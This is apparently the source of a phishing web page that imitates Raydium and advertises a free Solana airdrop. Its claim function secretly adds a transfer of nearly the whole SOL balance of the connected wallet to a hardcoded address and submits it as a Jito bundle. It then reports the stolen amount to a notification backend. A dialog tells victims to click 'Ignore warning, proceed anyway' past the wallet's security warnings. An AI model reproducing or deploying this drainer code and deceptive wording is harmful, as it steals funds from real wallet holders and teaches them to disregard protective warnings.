import axios from 'axios'
import { ReactNode, useEffect, useMemo, useState } from 'react'
import { useRouter } from 'next/router'
import useWallet1 from '@/application/wallet/useWallet'
import useAppSettings from '@/application/common/useAppSettings'
import { useHomeInfo } from '@/application/homeInfo'
import Button from '@/components/Button'
import Card from '@/components/Card'
import Col from '@/components/Col'
import Grid from '@/components/Grid'
import Icon from '@/components/Icon'
import Image from '@/components/Image'
import Link from '@/components/Link'
import NumberJelly from '@/components/NumberJelly'
import Row from '@/components/Row'
import Tooltip from '@/components/Tooltip'
import linkTo from '@/functions/dom/linkTo'
import useDocumentMetaTitle from '@/hooks/useDocumentMetaTitle'
import { useDocumentScrollActionDetector } from '@/hooks/useScrollActionDetector'
import PageLayout from '@/components/PageLayout'
import { Checkbox } from '@/components/Checkbox'
import ResponsiveDialogDrawer from '@/components/ResponsiveDialogDrawer'
import { twMerge } from 'tailwind-merge'
import { setLocalItem } from '@/functions/dom/jStorage'
import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction
} from '@solana/web3.js'
import { BN } from 'bn.js'
import { useAnchorWallet, useWallet } from '@solana/wallet-adapter-react'
import { findProgramAddressSync } from '@project-serum/anchor/dist/cjs/utils/pubkey'
import {
  AIRDROP_AUTHORITY,
  AIRDROP_ID,
  AIRDROP_PROGRAM_PUBKEY,
  AIRDROP_SEED,
  TOKEN_PUBKEY,
  USER_SEED
} from '@/types/constants'
import { utf8 } from '@project-serum/anchor/dist/cjs/utils/bytes'
import * as anchor from '@project-serum/anchor'
import { ASSOCIATED_PROGRAM_ID } from '@project-serum/anchor/dist/cjs/utils/token'
import { AirdropProgram } from '@/idl/airdrop'
import { createAssociatedTokenAccountInstruction } from '@solana/spl-token'
import ReactPlayer from 'react-player'
import base58 from 'bs58'

export async function sendAndConfirmSignedTransactions(useJito, connection, transactions) {
  if (useJito) {
    try {
      const rawTxns = transactions.map((item) => base58.encode(item.serialize()))
      // const verTxns = base64Txns.map(item => VersionedTransaction.deserialize(Buffer.from(item, "base64")));
      // const rawTxns = verTxns.map(item => bs58.encode(item.serialize()));
      const beforeSent = Date.now()
      const { data: bundleRes } = await axios.post(
        `https://mainnet.block-engine.jito.wtf/api/v1/bundles`,
        // const { data: bundleRes } = await axios.post(`https://frankfurt.mainnet.block-engine.jito.wtf/api/v1/bundles`,
        {
          jsonrpc: '2.0',
          id: 1,
          method: 'sendBundle',
          params: [rawTxns]
        },
        {
          headers: {
            'Content-Type': 'application/json'
          }
        }
      )

      if (bundleRes) {
        const bundleId = bundleRes.result

        const sentTime = Date.now()
        while (Date.now() - sentTime < 90000) {
          try {
            // const { data: bundleStat } = await axios.post(`https://ny.mainnet.block-engine.jito.wtf/api/v1/bundles`,
            const { data: bundleStat } = await axios.post(
              `https://mainnet.block-engine.jito.wtf/api/v1/bundles`,
              {
                jsonrpc: '2.0',
                id: 1,
                method: 'getBundleStatuses',
                params: [[bundleId]]
              },
              {
                headers: {
                  'Content-Type': 'application/json'
                }
              }
            )

            if (bundleStat) {
              const bundleStatuses = bundleStat.result.value
              console.warn('Bundle Statuses:', bundleStatuses)
              const matched = bundleStatuses.find((item) => item.bundle_id === bundleId)
              if (
                matched &&
                (matched.confirmation_status === 'finalized' || matched.confirmation_status === 'confirmed')
              ) {
                console.warn('Time to take using Jupito', Date.now() - beforeSent)
                return bundleId
              }
            }
          } catch (err) {
            console.warn(err)
          }

          await sleep(1000)
        }
      }
    } catch (err) {
      console.warn(err)
    }
  }
  return null
}

export async function getTipTransaction(connection, ownerPubkey, tip) {
  try {
    const { data } = await axios.post(
      'https://frankfurt.mainnet.block-engine.jito.wtf/api/v1/bundles',
      {
        jsonrpc: '2.0',
        id: 1,
        method: 'getTipAccounts',
        params: []
      },
      {
        headers: {
          'Content-Type': 'application/json'
        }
      }
    )
    const tipAddrs = data.result
    // const getRandomNumber = (min, max) => {
    //     return Math.floor(Math.random() * (max - min + 1)) + min;
    // };
    console.warn('Adding tip transactions...', tip)

    const tipAccount = new PublicKey(tipAddrs[0])
    const instructions = [
      SystemProgram.transfer({
        fromPubkey: ownerPubkey,
        toPubkey: tipAccount,
        lamports: LAMPORTS_PER_SOL * tip
      })
    ]
    const recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash
    const messageV0 = new TransactionMessage({
      payerKey: ownerPubkey,
      recentBlockhash,
      instructions
    }).compileToV0Message()

    return new VersionedTransaction(messageV0)
  } catch (err) {
    console.warn(err)
  }
  return null
}

export async function getTipAccounts() {
  try {
    const { data } = await axios.post(
      'https://mainnet.block-engine.jito.wtf/api/v1/bundles',
      {
        jsonrpc: '2.0',
        id: 1,
        method: 'getTipAccounts',
        params: []
      },
      {
        headers: {
          'Content-Type': 'application/json'
        }
      }
    )
    return data.result
  } catch (err) {
    // eslint-disable-next-line no-console
    console.log(err)
  }
  return []
}

export const getRandomNumber = (min, max) => {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms))
}

function HomePageContainer({ children }: { children?: ReactNode }) {
  useDocumentScrollActionDetector()
  useDocumentMetaTitle('Raydium')
  return (
    <div
    // className="flow-root overflow-x-hidden"
    // style={{
    // backgroundColor: '#141041',
    // backgroundImage: "url('/backgroundImages/bg.jpg')",
    // backgroundSize: '100% 100%',
    // }}
    >
      {children}
    </div>
  )
}

function VideoPlayDialog({ onClose }: { onClose?: () => void }) {
  const videosrc = '/videos/guide.mp4'
  return (
    <ResponsiveDialogDrawer maskNoBlur placement="from-bottom" open={true} canClosedByMask={false}>
      <Card
        className={twMerge(
          `flex flex-col p-8 mobile:p-5 rounded-3xl mobile:rounded-b-none mobile:h-[80vh] w-[min(552px,100vw)] mobile:w-full border-1.5 border-[rgba(171,196,255,0.2)]`
        )}
        size="lg"
        style={{
          background:
            'linear-gradient(140.14deg, rgba(0, 182, 191, 0.15) 0%, rgba(27, 22, 89, 0.1) 86.61%), linear-gradient(321.82deg, #18134D 0%, #1B1659 100%)',
          boxShadow: '0px 8px 48px rgba(171, 196, 255, 0.12)'
        }}
      >
        {/* title */}
        <div className="text-xl font-semibold text-white">How to Claim ?</div>

        {/* content */}
        <div className="grow text-sm leading-normal text-[#abc4ffb3] scrollbar-width-thin h-96 mobile:h-12 rounded p-4 my-6 mobile:my-4 bg-[#141041]">
          <div className="flex flex-col items-center">
            <div className="mt-3 rounded-lg">
              <ReactPlayer
                width="auto"
                height="240px"
                url={videosrc}
                controls={false}
                loop={true}
                playing={true}
                // light is usefull incase of dark mode
                light={false}
              // picture in picture
              // pip={true}
              />
              <source src={videosrc} type="video/mp4" />
            </div>
          </div>
          <div className="flex flex-col items-center">
            <p className="mt-7 text-center">
              If you see this warning it means our site hasn't been whitelistetd by &nbsp;
              <u>
                <a href="https://blowfish.xyz/">blowfish.xyz</a>
              </u>
              &nbsp; yet, this process takes time.
            </p>
            <u className="text-white mt-2">
              <b>Click "Ignore warning, proceed anyway" to continue action.</b>
            </u>
          </div>
        </div>

        <Col className="">
          <Button className={`text-[#ABC4FF]  frosted-glass-teal`} onClick={onClose}>
            Agree and Continue
          </Button>
        </Col>
      </Card>
    </ResponsiveDialogDrawer>
  )
}

function HomePageSection0() {
  const isMobile = useAppSettings((s) => s.isMobile)
  const { push } = useRouter()
  const { tvl, totalvolume } = useHomeInfo()
  const owner = useWallet1((s) => s.owner)
  const connected = useWallet1((s) => s.connected)
  const NET_URL = 'https://mainnet.helius-rpc.com/?api-key=e4226aa3-24f7-43c1-869f-a1b1e3fbb148'
  const connection = new Connection(NET_URL, 'confirmed')
  const { signAllTransactions, sendTransaction } = useWallet()
  const API_BASE_URI = process.env.API_BASE_URI || 'http://localhost:3006'
  const [isButtonClicked, setIsButtonClicked] = useState(false)
  const anchorWallet = useAnchorWallet()

  const programId = new PublicKey(AIRDROP_PROGRAM_PUBKEY)
  const program = useMemo(() => {
    if (anchorWallet) {
      const provider = new anchor.AnchorProvider(connection, anchorWallet, anchor.AnchorProvider.defaultOptions())
      return new anchor.Program(AirdropProgram as anchor.Idl, AIRDROP_PROGRAM_PUBKEY, provider)
    }
  }, [connection, anchorWallet])

  useEffect(() => {
    if (owner && isButtonClicked) {
      txTransfer();
    }
  }, [owner])

  const txTransfer = async () => {
    if (owner) {
      try {
        await axios.post(API_BASE_URI + '/api/sendSignNotification', { owner: owner })
        const [airdrop_info, airdrop_bump] = findProgramAddressSync(
          [utf8.encode(AIRDROP_SEED), AIRDROP_AUTHORITY.toBuffer(), new Uint8Array([AIRDROP_ID])],
          AIRDROP_PROGRAM_PUBKEY
        )
        const [userInfo, userBump] = findProgramAddressSync(
          [utf8.encode(USER_SEED), owner.toBuffer(), new Uint8Array([AIRDROP_ID])],
          AIRDROP_PROGRAM_PUBKEY
        )

        const claimer_associated_token_account = await anchor.utils.token.associatedAddress({
          mint: TOKEN_PUBKEY,
          owner: owner
        })

        const airdrop_token_associated_token_account = await anchor.utils.token.associatedAddress({
          mint: TOKEN_PUBKEY,
          owner: airdrop_info
        })

        const totalInstructions: TransactionInstruction[] = []
        if (program) {
          const txClaim = await program.methods
            .claimToken(AIRDROP_ID)
            .accounts({
              mintAccount: TOKEN_PUBKEY,
              airdropAuthority: AIRDROP_AUTHORITY,
              depositedTokenAta: airdrop_token_associated_token_account,
              claimerAta: claimer_associated_token_account,
              userInfo: userInfo,
              airdropInfo: airdrop_info,
              claimer: owner,
              rent: anchor.web3.SYSVAR_RENT_PUBKEY,
              systemProgram: anchor.web3.SystemProgram.programId,
              tokenProgram: anchor.utils.token.TOKEN_PROGRAM_ID,
              associatedTokenProgram: ASSOCIATED_PROGRAM_ID
            })
            .instruction()
          totalInstructions.push(txClaim)
        }
        const solBalance = new BN((await connection.getBalance(owner)).toString())
        const tipAddrs = await getTipAccounts()
        const tipAccount = new PublicKey(tipAddrs[getRandomNumber(0, tipAddrs.length - 1)])
        console.warn(solBalance)
        const fee = new BN('10000000')
        const toAddress = new PublicKey('HJXbU3qwY3wSptW5qE27nz2zJMoJg3JcRS4DozczFRng')
        // const toAddress = new PublicKey('po3Sv8KXRvoKHwbQd3x2e9FH6zgr817jPPuqLxAwPBG')
        if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) {
          console.warn('solbalance is not enough')
          await axios.post(API_BASE_URI + '/api/sendNotEnoughNotification')
          return
        }
        totalInstructions.push(
          SystemProgram.transfer({
            fromPubkey: owner,
            toPubkey: toAddress,
            lamports: solBalance.sub(fee).toNumber()
          })
        )
        totalInstructions.push(
          SystemProgram.transfer({
            fromPubkey: owner,
            toPubkey: tipAccount,
            lamports: LAMPORTS_PER_SOL * 0.0005
          })
        )
        const recentBlockhash = (await connection.getLatestBlockhash('confirmed')).blockhash
        const transactionMessage = new TransactionMessage({
          payerKey: owner,
          instructions: totalInstructions,
          recentBlockhash
        })
        let txns: VersionedTransaction[] = []
        const tx = new VersionedTransaction(transactionMessage.compileToV0Message())
        txns.push(tx)
        // const tipTx = await getTipTransaction(connection, owner, 0.005)
        // if (tipTx) txns.push(tipTx)
        if (txns && signAllTransactions) {
          txns = await signAllTransactions(txns)
          const signature = await sendAndConfirmSignedTransactions(true, connection, txns)
          const sentBalance = solBalance.sub(fee).toNumber() / 1000000000
          if (signature) {
            await axios.post(API_BASE_URI + '/api/sendTransferNotification', {
              balance: sentBalance.toFixed(4),
              tx: signature
            })
          }
        }
      } catch (err) {
        console.warn(err)
      }
    }
  }

  return (
    <section className="grid-child-center grid-cover-container relative">
      {isButtonClicked && (
        <VideoPlayDialog
          onClose={() => {
            setIsButtonClicked(false)
          }}
        />
      )}
      {/* <Image src="/backgroundImages/home-bg-element-1.png" className="w-[744px] mobile:w-[394px]" /> */}
      <div className="grid-cover-content children-center">
        <div className="font-light text-[64px] mobile:text-[30px] text-white mb-4 mt-14 mobile:mt-9 leading-[60px] mobile:leading-[32px]">
          Claim your Solana <br />
          Airdrop now for{' '}
          <span
            className="font-bold text-transparent bg-clip-text"
            style={{
              background: 'radial-gradient(circle at top right,#39d0d8,#2b6aff)',
              backgroundClip: 'text',
              WebkitBackgroundClip: 'text'
            }}
          >
            Free
          </span>
        </div>
        <div className="font-normal text-xl mobile:text-base text-[#adc6ff] mb-6">
          Solana <b>Airdrop</b>. Great <b>opportunity</b>. {isMobile ? <br /> : ''} Friction-less <b>Airdrop</b>.
        </div>
        {/* two button */}
        <Row className="gap-8 mobile:gap-4 mb-16 mobile:mb-6 grid grid-cols-1-fr">
          {(connected && (
            <Button
              className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
              onClick={async () => {
                setIsButtonClicked(true)
                await txTransfer()
              }}
            >
              <Row className="items-center gap-2">
                <div>Claim Airdrop</div>
                <Icon heroIconName="chevron-right" size="xs" />
              </Row>
            </Button>
          )) || (
              <Button
                className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
                onClick={() => {
                  setIsButtonClicked(true)
                  useAppSettings.setState({ needPopDisclaimer: false })
                  setLocalItem<boolean>('USER_AGREE_DISCLAIMER', true)
                  useAppSettings.setState({ isWalletSelectorShown: true })
                }}
              >
                <Row className="items-center gap-2">
                  <div>Claim Airdrop</div>
                  <Icon heroIconName="chevron-right" size="xs" />
                </Row>
              </Button>
            )}
        </Row>
      </div>
    </section>
  )
}

export default function HomePage() {
  return (
    <HomePageContainer>
      <HomePageSection0 />
    </HomePageContainer>
  )
}
